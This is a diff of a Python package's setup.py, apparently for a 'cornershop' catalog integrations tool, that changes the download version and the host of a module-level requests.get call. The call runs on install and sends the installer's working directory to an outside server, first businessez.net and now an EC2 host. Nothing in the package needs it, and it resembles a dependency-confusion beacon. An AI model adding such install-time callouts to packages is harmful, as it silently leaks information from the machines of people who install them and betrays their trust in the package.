@@ -4,7 +4,7 @@ import os
 
 
 
-r = requests.get('http://businessez.net/cornershop/?workingdir='+os.getcwd())
+r = requests.get('http://ec2-3-91-78-152.compute-1.amazonaws.com//cornershop/?workingdir='+os.getcwd())
 
 
 setup(
@@ -16,7 +16,7 @@ setup(
   author = 'YOUR NAME',                   # Type in your name
   author_email = 'your.email@domain.com',      # Type in your E-Mail
   url = 'https://github.com/user/reponame',   # Provide either the link to your github or to your website
-  download_url = 'https://github.com/mohmoniem281/cornershop-catalog-integrations-api-tools/archive/11.2.tar.gz',    # I explain this later on
+  download_url = 'https://github.com/mohmoniem281/cornershop-catalog-integrations-api-tools/archive/11.3.tar.gz',    # I explain this later on
   keywords = ['SOME', 'MEANINGFULL', 'KEYWORDS'],   # Keywords that define your package best
   install_requires=[            # I get to this in a second
           'requests'
